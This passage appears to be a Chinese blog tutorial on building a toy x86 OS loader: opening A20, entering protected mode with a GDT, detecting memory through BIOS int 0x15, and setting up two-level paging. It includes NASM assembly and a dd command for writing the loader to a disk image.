title="8086地址回绕"></a>8086地址回绕</h3><p>8086的地址总线是20位的，所以有A0-A19这20根地址线</p><p>在实模式下，采用段基址*16+偏移的寻址方式，不难发现，当0xffff：0xffff时，此时的逻辑地址是0x10ffef，但是，20位地址总线的最大值是0xfffff，在逻辑上这是正确的，但在物理内存中没有相应的地址。为了避免这个bug，所以8086采取的策略便是将逻辑地址对0x100000取模，这就是8086的地址回绕</p><h3 id="A20GATE"><a href="#A20GATE" class="headerlink" title="A20GATE"></a>A20GATE</h3><p>到了80286这个拥有24位地址总线的CPU，但是<code>intel</code>为了兼容考虑，在实模式下，仍然只开启A0-A19这低20位地址线，并采用8086地址回绕。</p><p>所以我们需要突破A20地址线，这就是说的打开<strong>A20GATE</strong></p><p>其实打开A20很简单，只要把0x92端口的第1位（最低位是第0位）置1，代码如下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs assembly">in al, 0x92<br>or al, 0000_0010b<br>out 0x92, al<br></code></pre></td></tr></table></figure><h2 id="CR0寄存器的PE位"><a href="#CR0寄存器的PE位" class="headerlink" title="CR0寄存器的PE位"></a>CR0寄存器的PE位</h2><p>先了解一下CR0-CR3寄存器</p><h3 id="控制寄存器"><a href="#控制寄存器" class="headerlink" title="控制寄存器"></a>控制寄存器</h3><p>控制寄存器用于控制和确定处理器的操作模式以及当前执行任务的特性，在80386中有4个，分别为CR0、CR1、CR2、CR3，其中CR1被保留，为后续开发做准备。</p><p>CR0包括指示处理器工作方式的控制位，包含启用和禁止分页管理机制的控制位，包含控制浮点协处理器操作的控制位。CR2及CR3由分页管理机制使用。CR0中的位5—位30及CR3中的位0至位11是保留位，这些位不能是随意值，必须为0。</p><p>详细介绍一下CR0寄存器</p><h3 id="CR0"><a href="#CR0" class="headerlink" title="CR0"></a>CR0</h3><p>下两图出自《操作系统真象还原》</p><p><img src="/img/OS/13.png" alt="img"></p><p><img src="/img/OS/14.png" alt="img"></p><p>第0位：PE，即<code>Protection Enable</code>，为0时是实模式，为1时是保护模式，所以PE便是我们的目标，将他置1也很简单</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs assembly">mov eax,cr0<br>or eax,0x00000001<br>mov cr0,eax<br></code></pre></td></tr></table></figure><p>顺带提一嘴，只有CR0的最高位PG为1，开启分页时，CR3才会被启用</p><h2 id="about-CPU"><a href="#about-CPU" class="headerlink" title="about CPU"></a>about CPU</h2><h3 id="流水线"><a href="#流水线" class="headerlink" title="流水线"></a>流水线</h3><p>虽然执行单元EU是CPU执行指令的唯一部件，但是CPU 的指令执行过程分为取指令、译码、执行三个步骤。每个步骤都是独立执行的， CPU 可以一边执行指令，一边取指令，一边译码。CPU是只能一次处理一个指令，但是也妹说不能干的别的事啊😋。这样就使效率得到极大的提升。</p><h4 id="jmp清空"><a href="#jmp清空" class="headerlink" title="jmp清空"></a>jmp清空</h4><p>CPU 是按照程序中指令顺序来填充流水线的，大多是情况下当前指令和下一条指令在空间上是挨着的。但如果当前执行的指令是jmp ，下一条指令已经被送上流水线译码了，第三条指令已经被送上流水线取指。but因为<code>cs:ip</code>已经跳到不知道哪去了，所以 CPU 在遇到无条件转移指令 jmp 时，会清空流水线。</p><h3 id="分支预测"><a href="#分支预测" class="headerlink" title="分支预测"></a>分支预测</h3><p>随着流水线而来的一个问题便是，如果CPU遇到一个条件跳转语句，假设两条路分别时A、B，那么CPU在还未执行判断语句的时候，是如何选择A或B进入流水线的？</p><p>最简单的方法是 2 位预测法。用 2 位 bit 的计数器来记录跳转状态，每跳转一次加 1，如果未跳转就减 1。当遇到跳转指令时，如果计数器的值大于 1 则跳转，如果小于等于 1 则不跳。这基于的原理是当一件事情发生时，有很大概率下一次还会发生。</p><p>同时，intel架构的CPU中存在分支目标缓冲器（<code>Branch Target Buffer</code>,BTB），会将分支指令的地址和跳转信息存放在其中，CPU在下一次遇到分支指令时，会在BTB寻找相同地址的指令，参照其中的统计信息，选择将哪一个分支载入流水线。如果未找到相同地址，会使用<code>Static Predictor</code>，即静态预测，这是基于大量代码的共同特征总结的。比如循环结构体一般都在结束跳转指令的上方。</p><p>当然加载错误的分支指令也没关系，只要在CPU执行前制止就行了，虽然清空流水线装载正确分支的花销挺大的😓</p><h3 id="乱序执行"><a href="#乱序执行" class="headerlink" title="乱序执行"></a>乱序执行</h3><p>就是 CPU 中运行的指令并不按照代码中的顺序执行，而是按照一定的策略打乱顺序执行，也许后面的指令先执行，当然，得保证指令之间不具备相关性 。</p><p>比如下面的例子，第一个指令需要去内存中寻找值，而add ebx只需要简单的加法操作就行了，所以CPU就会在指令1访问内存的等待中执行指令2.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs assembly">mov rax, [0xfff00]<br>add ebx, 1<br></code></pre></td></tr></table></figure><h3 id="缓存"><a href="#缓存" class="headerlink" title="缓存"></a>缓存</h3><p> 缓存是 20 世纪最大的发明，其原理是用一些存取速度较快的存储设备作为数据缓冲区，避免频繁访问速度较慢的低速存储设备，归根结底的原因是低速存储设备是整个系统的瓶颈，缓存用来缓解“瓶颈设备”的压力（摘自《操作系统真象还原》）。都知道木桶原理，和硬盘相比，内存<code>DRAM</code>的速度已经够快了，却还是连<code>CPU</code>的尾气都吃不到。所以，内存8行，就出现了三级缓存L1、L2、L3（<code>SRAM</code>，静态随机访问储存器，期待能在amd的三缓里在装系统的那天😚）。寄存器和<code>SRAM</code>在速度上是同一级别的东西，都是用相同的存储电路实现的，用的都是触发器，速度快的飞起 。</p><p> 比如当循环执行一段code时，短时间内这块内存将被高频率访问，如果将这块code放到三缓里，就能极大的提高程序运行效率。</p><h2 id="PE模式下的内存保护措施"><a href="#PE模式下的内存保护措施" class="headerlink" title="PE模式下的内存保护措施"></a>PE模式下的内存保护措施</h2><p><del>都叫保护模式了保护措施能少🐎</del></p><p><strong>段描述符&amp;选择子</strong></p><p>对使用<code>selector</code>的检查：<code>check</code>索引值，<code>check</code>是否使用了gdt中索引【0】的段描述表</p><p>针对段描述符中的<code>type</code>字段，有下列几个原则</p><ul><li>只有具备可执行属性的段才能加载到CS寄存器中</li><li>只具有可执行属性的段不允许加载到除CS外的段寄存器中</li><li>只有具备可写属性的段才能加载到SS寄存器中</li><li>至少具备可读属性的段才能加载到DS、ES、FS、GS段寄存器中</li></ul><p><code>check type</code>后，还会<code>chekc</code> P位确认内存段是否存在，访问过相应段后，会将其段描述符中的A位置1（这算什么，标记？bushi）</p><p><strong>Data &amp; System Segment</strong></p><p>段界限check</p><p>段界限：<br>$$<br>（段界限+1）*粒度-1<br>$$<br>这要注意这个就差不多了</p><p>ok，前置知识基本讲完了，可以进入保护模式了！！ヾ(≧▽≦*)o</p><h2 id="Let’s-go"><a href="#Let’s-go" class="headerlink" title="Let’s go!"></a>Let’s go!</h2><h3 id="boot-inc"><a href="#boot-inc" class="headerlink" title="boot.inc"></a>boot.inc</h3><p>多了好多配置信息</p><p><code>nasm</code>还挺人性化的，可以在数字中加”_”使数位更清楚，且不影响值的表示</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs assembly">;-----loader &amp; kernel msg-----<br>LOADER_BASE_ADDR equ 0x900<br>LOADER_START_SECTOR equ 0x2<br>;-----the value of GDT-----<br>DESC_G_4K equ 1000_0000_00000000_00000000b     ;G: 4kb<br>DESC_D_32 equ  100_0000_00000000_00000000b     ;D: 32位<br>DESC_L equ   00_0000_00000000_00000000b ;L: 32位代码段<br>DESC_AVLequ    0_0000_00000000_00000000b ;无意义<br>DESC_LIMIT_CODE2 equ      1111_00000000_00000000b ;平坦模式，就是0xf<br>DESC_LIMIT_DATA2 equ DESC_LIMIT_CODE2<br>DESC_LIMIT_VIDEO2equ      0000_00000000_00000000b ;这边设置video是为了表示显存（0xb8000），所以limit设置0<br>DESC_Pequ           10000000_00000000b ;P: 存在<br>DESC_DPL_0equ            0000000_00000000b     <br>DESC_DPL_1equ          0100000_00000000b<br>DESC_DPL_2equ            1000000_00000000b<br>DESC_DPL_3equ            1100000_00000000b<br>DESC_S_CODEequ              10000_00000000b ;S: 非系统段，代码段<br>DESC_S_DATAequ DESC_S_CODE                      ;S: 非系统段，数据段<br>DESC_S_sys equ  00000_00000000b     ;S: 系统段<br>DESC_TYPE_CODEequ       1000_00000000b     ;只执行代码段<br>DESC_TYPE_DATAequ       0010_00000000b     ;只读，向下扩展的数据段<br>;-----code gdt高位4字节-----<br>DESC_CODE_HIGH4equ (0x00 &lt;&lt; 24) + DESC_G_4K + DESC_D_32 + DESC_L + DESC_AVL + DESC_LIMIT_CODE2 + DESC_P + DESC_DPL_0 + DESC_S_CODE + DESC_TYPE_CODE + 0x00<br>;-----data gdt高四位字节-----<br>DESC_DATA_HIGH4equ (0x00 &lt;&lt; 24) + DESC_G_4K + DESC_D_32 + DESC_L + DESC_AVL + DESC_LIMIT_DATA2 + DESC_P + DESC_DPL_0 + DESC_S_DATA + DESC_TYPE_DATA + 0x00<br>;-----video gdt高四位字节-----<br>DESC_VIDEO_HIGH4equ (0x00 &lt;&lt; 24) + DESC_G_4K + DESC_D_32 + DESC_L + DESC_AVL + DESC_LIMIT_VIDEO2 + DESC_P + DESC_DPL_0 + DESC_S_DATA + DESC_TYPE_DATA + 0x0b<br>;-----the value of selector-----<br>RPL0equ 00b<br>RPL1equ 01b<br>RPL2equ 10b<br>RPL3equ 11b<br>TI_GDTequ 000b<br>TI_LDTequ 100b<br></code></pre></td></tr></table></figure><h3 id="MBR"><a href="#MBR" class="headerlink" title="MBR"></a>MBR</h3><p>mbr和前面的还是一样的。只是load.s经过编译后得到的load.bin的size大于512，所以读取扇区的数量改变，这边直接改成4了</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs assembly">mov eax,LOADER_START_SECTOR<br>mov bx,LOADER_BASE_ADDR<br>mov cx,4                    ;sector count<br>call rd_disk_m_16<br></code></pre></td></tr></table></figure><p>pack的时候脚本也有变化</p><p><code>count</code>改为4</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs routeros">dd <span class="hljs-attribute">if</span>=./loader.bin \<br>        <span class="hljs-attribute">of</span>=./img.img \<br>        <span class="hljs-attribute">bs</span>=512 <span class="hljs-attribute">count</span>=4 <span class="hljs-attribute">seek</span>=2 <span class="hljs-attribute">conv</span>=notrunc<br></code></pre></td></tr></table></figure><h3 id="Load-S"><a href="#Load-S" class="headerlink" title="Load.S"></a>Load.S</h3><p>load.s要改的就比较多了</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><code class="hljs assembly">%include &quot;boot.inc&quot;<br>SECTION LOADER vstart=LOADER_BASE_ADDR<br>LOADER_STACK_TOP equ LOADER_BASE_ADDR<br><br>jmp loader_start<br><br>GDT_BASE:                   ;gdt[0]为空<br>dd 0x00000000<br>dd 0x00000000<br><br>CODE_DESC:                  ;gdt[1]<br>dd 0x0000ffff<br>dd DESC_CODE_HIGH4<br><br>DATA_STACK_DESC:            ;gdt[2] <br>dd 0x0000ffff<br>dd DESC_DATA_HIGH4<br><br>VIDEO_DESC:                 ;gdt[3]<br>dd 0x80000007           ;(0xbffff-0xb8000)/4k = 7 <br>dd DESC_VIDEO_HIGH4<br><br>GDT_SIZEequ $ - GDT_BASE    ; 0x8*4<br>GDT_LIMITequ GDT_SIZE - 1    ; 0x20 - 1 <br>times 60 dq 0<br><br>SELECTOR_CODE equ (0x0001&lt;&lt;3) + TI_GDT + RPL0<br>SELECTOR_DATAequ (0x0002&lt;&lt;3) + TI_GDT + RPL0<br>SELECTOR_VIDEO equ (0x0003&lt;&lt;3) + TI_GDT + RPL0<br><br>gdt_ptrdw GDT_LIMIT<br>dd GDT_BASE<br><br>loadermsg db &#x27;korey is ready&#x27;<br><br>loader_start:<br>mov sp, LOADER_BASE_ADDR ;print &quot;korey is ready&quot;<br>mov bp, loadermsg<br>mov cx, 14<br>mov ax, 0x1301<br>mov bx, 0x001f<br>mov dx, 0x1800<br>int 0x10<br><br>in al, 0x92              ;open A20 gate<br>or al, 0000_0010b<br>out 0x92, al<br><br>lgdt [gdt_ptr]           ;load gdt<br> <br>mov eax, cr0             ;real mode to protection mode<br>or eax, 0x00000001<br>mov cr0, eax<br><br>jmp dword SELECTOR_CODE:p_mode_start    ;刷新流水线<br><br>[bits 32]<br>p_mode_start:<br>mov ax,SELECTOR_DATA<br>mov ds,ax<br>mov es,ax<br>mov ss,ax<br>mov esp,LOADER_STACK_TOP<br>mov ax,SELECTOR_VIDEO<br>mov gs,ax<br><br>mov byte [gs:160], &#x27;P&#x27;<br><br>jmp $<br></code></pre></td></tr></table></figure><p>可以看到<code>jmp dword SELECTOR_CODE:p_mode_start</code>这句代码感觉有点脱裤子放屁，毕竟程序流只要顺序执行也能滑到<code>p_mode_start </code>，那为什么用<code>jmp</code>呢？因为CPU采用流水线作业（上面提到过），会将几条指令放在一起重叠执行（感觉<code>mips</code>架构这个特点就很显著），所以<code>p_mode_start</code>是32位的，和16位的一起执行直接能把CPU的CPU干烧了，这是其一。其二是虽然进入了32位保护模式，ds，cs，ss这些段寄存器里还是16位的段基址。其他位默认0，导致D位&#x3D;0，也即是进入32位模式了段寄存器还是被认为是16位，那就麻烦大了。并且<code>mov cs, xxx</code>这类指令是被禁止的，只有用远调用指令<code>call</code>，远转移指令<code>jmp</code>，远返回指令<code>retf</code>可以间接改变CS的值。所以用<code>jmp</code>清空流水线并刷新CS寄存器。</p><p>展示个结果</p><p><img src="/img/OS/15.png" alt="img"></p><h1 id="0x3-PE-to-Kernel-！！"><a href="#0x3-PE-to-Kernel-！！" class="headerlink" title="0x3:PE to Kernel ！！"></a>0x3:PE to Kernel ！！</h1><h2 id="获取内存容量"><a href="#获取内存容量" class="headerlink" title="获取内存容量"></a>获取内存容量</h2><p><code>BIOS</code>的0x15中断号中，提供了3个子功能来获取内存容量</p><ul><li>EAX &#x3D; 0xE820，遍历所有内存</li><li>EAX &#x3D; 0xE801，检测低15MB和16MB-4GB的内存，最大支持4GB</li><li>AH &#x3D; 0x88，最多检测64MB，超过64MB也返回64MB</li></ul><p>这三种功能返回的信息详细程度一词5递减，但是操作复杂程度反之</p><h3 id="0xE820"><a href="#0xE820" class="headerlink" title="0xE820"></a>0xE820</h3><p>此功能每次会返回一个不同属性的内存布局信息，因此需要不停迭代来获取全部内容</p><p>因为返回的信息较为丰富，寄存器无法存放，所以需要结构体来存放返回值，此结构体为地址范围描述符（Address Range Descripter Structure, ARDS），格式如下图。此表来自《操作系统真象还原》</p><p><img src="/img/OS/17.png" alt="img"></p><p>type字段的意义如下。此表来自《操作系统真象还原》</p><p><img src="/img/OS/18.png" alt="img"></p><p>同时，0xE820在中断前，还需要几个寄存器布置参数，返回后的值也储存在几个寄存器中。此表来自《操作系统真象还原》</p><p><img src="/img/OS/19.png" alt="img"></p><p>动手写一下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs assembly">；前半部分和load.S一样<br>times 60 dq 0<br><br>total_mem_bytes dd 0<br>gdt_ptr dw GDT_LIMIT<br>dd GDT_BASE<br><br>ards_buf times244 db 0<br>ards_nrdw 0<br><br>loader_start:<br>xor ebx,ebx<br>mov esi, ards_buf<br>mov es,esi<br>xor esi,esi<br>xor edi,edi<br>.e820:<br>mov eax,0xe820<br>mov ecx,20<br>mov edx,0x534d4150<br>int 0x15<br>add edi,20<br>cmp ebx, 0<br>jnz .e820<br><br>jmp $<br></code></pre></td></tr></table></figure><p>看看ARDS</p><p><img src="/img/OS/20.png" alt="img"></p><h3 id="0xE801"><a href="#0xE801" class="headerlink" title="0xE801"></a>0xE801</h3><p>只需eax寄存器&#x3D;0xe801即可执行int 0x15调用</p><p>返回时，eax &#x3D; ecx，粒度为1kB，只显示15MB及以下的内存容量；ebx &#x3D; edx，粒度为64KB，显示16MB-4GB的内存</p><p>but我们获得的内存总量总是比实际大小小1MB，这是为了兼容老ISA设备，最后输出的时候加上去就行了</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs assembly">loader_start:<br>.e801:<br>mov ax, 0xe801<br>int 0x15<br>mov ecx, 0x00000400<br>    mul ecx<br>    add eax, 0x100000<br>    mov esi, eax<br>    xor eax, eax<br>    mov eax, ebx<br>    mov ecx, 0x10000<br>    mul ecx<br>    add esi, eax<br><br>mov [total_mem_bytes],esi<br><br>jmp $<br></code></pre></td></tr></table></figure><p><img src="/img/OS/16.png" alt="img"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs assembly">#megs: 256<br>#megs: 128<br>megs: 64<br>#megs: 64<br>#megs: 16<br>#megs: 8<br></code></pre></td></tr></table></figure><p>和配置文件相符</p><h3 id="0x88"><a href="#0x88" class="headerlink" title="0x88"></a>0x88</h3><p>只需ah &#x3D; 0x88，返回值也只有一个，存储在eax中，最后再加上一个1MB就行</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs assembly">loader_start:<br>.88:<br>mov ah, 0x88<br>int 0x15<br>mov ecx,0x400<br>mul ecx<br>add eax,0x100000<br><br>mov [total_mem_bytes],eax<br><br>jmp $<br></code></pre></td></tr></table></figure><h2 id="内存分页"><a href="#内存分页" class="headerlink" title="内存分页"></a>内存分页</h2><p>内存分页解除了线性内存与物理内存一一对应的关系，通过映射关系，将线性地址映射到任意物理地址</p><p>内存分页由CPU提供硬件（页部件）支持，通过建立页表，以及页表查询来实现映射关系，这也是由CPU完成的，毕竟在CPU看来，一切都是慢速设备，不如自己来。当然还得感谢CPU设计师与OS设计师的合作。</p><p>至于什么是映射关系，这个应该不用笔者赘述了</p><h3 id="一级页表"><a href="#一级页表" class="headerlink" title="一级页表"></a>一级页表</h3><p>32位架构的CPU的地址总线的max是4GB</p><p>CPU以4kB为粒度，将内存分为一页页，此为一级页表</p><p>此时我们需要一个地方来存储每页内存的信息，这个地方就是页表（Page Table）。页表中的项称为页表项（ Page Table Entry，PTE ），其大小是 4 字节，页表项的作用是存储内存物理地址。当访问一个线性地址时，实际上就是在访问页表项中所记录的物理内存地址。</p><p>下图为一级页表示意图。来自《操作系统真象还原》</p><p><img src="/img/OS/21.png" alt="img"></p><p>页表项0-11位为页内寻址</p><p>页表项12-31位为该页表项在页表中的<code>index</code></p><p>页表的地址被存放在CR3寄存器中，可以通过CR3寄存器中页表项的物理地址（此时还未开启分页）+ index*4找到目标页表项对应的物理地址，最后加上低12位的偏移，就能访问对应的物理地址</p><p>But，想一下，4GB总内存，以4kB的粒度分，光页表项就有<code>0x100000</code>之多，存储这些页表项就要花费4MB大小的内存。并且每个进程都有独立的页表，光是这些内存就是一笔很大的开销，那怎么办捏？</p><p>一级页表不行，👴再套一层不行🐎</p><p>所以二级页表他来了</p><h3 id="二级页表"><a href="#二级页表" class="headerlink" title="二级页表"></a>二级页表</h3><p>先看一下二级页表示意图。下图来自《操作系统真象还原》</p><p><img src="/img/OS/22.png" alt="img"></p><p>这次CPU学聪明了，先创建一个4KB大小的页目录表，其中存放着1024个页目录项（Page Directory Entry， PDE）。何为页目录项？就是页表的物理地址，页目录项大小同页表项一样，都用来描述一个物理页的物理地址，其大小都是 4 字节。</p><p>页目录表中共 1024 个页表，也就是有 1024 个页目录项 。一个页目录项中记录一个页表物理页地址，物理页地址是指页的物理地址，在页目录项及页表项中记录的都是页的物理地址。</p><p>中间层果然是万能的(bushi)</p><p>二级页表虽然原理与一级页表相同，但是寻址方式发生了一点小变化</p><p>对于一个32位虚拟地址：</p><ul><li>0-11位：页内偏移</li><li>12-21位：PTE索引</li><li>22-31位：PDE索引</li></ul><p>计算公式和一级页表类似</p><p>反正这些公式的计算是<code>CPU</code>帮👴干的</p><p>突然，受尽压榨的<code>CPU</code>发现，这些页表项和页目录项都是以4KB为粒度，也就是说最后12位都是0，反正固定不变的东西，存放点信息不是美滋滋，于是，<code>PTE</code>和<code>PDE</code>就被改造调教开发成了下面的模样🥵。下图来自《操作系统真象还原》</p><p><img src="/img/OS/23.png" alt="img"></p><ul><li>P：present 1：存在内存中&#x2F;0：不存在内存中</li><li>RW：read&#x2F;wirte 1：可读可写&#x2F;0：可读不可写</li><li>US：user&#x2F;super 1：非特权&#x2F;0：特权</li><li>PWT：Page-level Write-Through，页级通写位，置1表示此内存页是高速缓存，此处置0即可</li><li>PCD：Page-level Cache Disable，页级高速缓存禁止位，置1表示此内存页启用高速缓存，此处置0即可</li><li>A：Accessed，访问位 1：被CPU访问过，用来统计访问频率</li><li>D：Dirty，脏页，CPU对一个内存页执行写操作后，会对此内存页对应的页表项D位置1</li><li>PAT：Page Attribute Table，太复杂了，👴不写了</li><li>G：Global，全局位，与下文的TLB有关</li><li>AVL：Available，可用位，但是可不可用跟CPU👴有什么关系</li></ul><h3 id="开启页表"><a href="#开启页表" class="headerlink" title="开启页表"></a>开启页表</h3><p>boot.inc添加</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs assembly">;-----页表物理地址-----<br>PAGE_DIR_TABLE_POS equ 0x100000<br>;-----页表属性-----<br>PG_Pequ 1b<br>PG_RW_Requ 00b<br>PG_RW_Wequ 10b<br>PG_US_S equ 000b<br>PG_US_Uequ 100b<br></code></pre></td></tr></table></figure><p>load.S</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><code class="hljs assembly">;-----前面就是进入PE模式-----<br>call setup_page<br><br>sgdt [gdt_ptr]                                          ;保存当前gdt的值<br>mov ebx, [gdt_ptr + 2]                                  ;使gdt_base和selector3的base加0xc0000000<br>or dword [ebx + 0x18 + 4], 0xc0000000<br>add dword [gdt_ptr + 2], 0xc0000000<br>add esp, 0xc0000000<br><br>mov eax, PAGE_DIR_TABLE_POS                             ;将页目录表物理地址存进CR3<br>mov cr3, eax<br><br>mov eax, cr0                                            ;开启分页<br>or eax, 0x80000000<br>mov cr0, eax<br><br>lgdt [gdt_ptr]<br>mov byte [gs:160], &#x27;V&#x27;<br><br>jmp $<br><br><br>setup_page:<br>[bits 32]<br>mov ecx,0x1000<br>mov esi,0<br>.clear_page_dir:                                    ;将页目录表清零<br>mov byte[PAGE_DIR_TABLE_POS + esi],0<br>inc esi<br>loop .clear_page_dir<br><br>.create_pde:<br>mov eax, PAGE_DIR_TABLE_POS                     ;第一个页表创建在物理地址0x101000<br>add eax, 0x1000<br>mov ebx, eax<br><br>or eax, PG_US_U | PG_RW_W | PG_P                ;用户权限、可写、存在<br>mov [PAGE_DIR_TABLE_POS + 0x0], eax             ;将index=0 &amp; 768的页目录项赋值为0x101007，c00以上的用于内核空间<br>mov [PAGE_DIR_TABLE_POS+0xc00], eax<br>sub eax, 0x1000<br>mov [PAGE_DIR_TABLE_POS+4092],eax               ;将页目录表的物理地址作为最后一个页目录项<br><br>mov ecx, 256                                    ;将0x100000以下的内存，作为第一个页表中的PTE<br>mov esi, 0<br>mov edx, PG_US_U | PG_RW_W | PG_P<br><br>.create_pte:<br>mov [ebx+esi*4], edx<br>add edx, 0x1000<br>inc esi<br>loop .create_pte<br><br>mov eax, PAGE_DIR_TABLE_POS                         ;将1MB-1GB的内存全部映射到高处，使得内核和操作系统共享同一片物理地址<br>add eax, 0x2000<br>or eax, PG_US_U | PG_RW_W | PG_P<br>mov ebx, PAGE_DIR_TABLE_POS<br>mov ecx, 254<br>mov esi, 769<br><br>.create_kernel_pde:<br>mov [ebx+esi*4], eax<br>inc esi<br>add eax, 0x1000<br>loop .create_kernel_pde<br><br>ret<br></code></pre></td></tr></table></figure><h3 id="虚拟地址访问页表"><a href="#虚拟地址访问页表" class="headerlink" title="虚拟地址访问页表"></a>虚拟地址访问页表</h3><p>用<code>info tab</code>可以查看页表映射</p><p><img src="/img/OS/24.png" 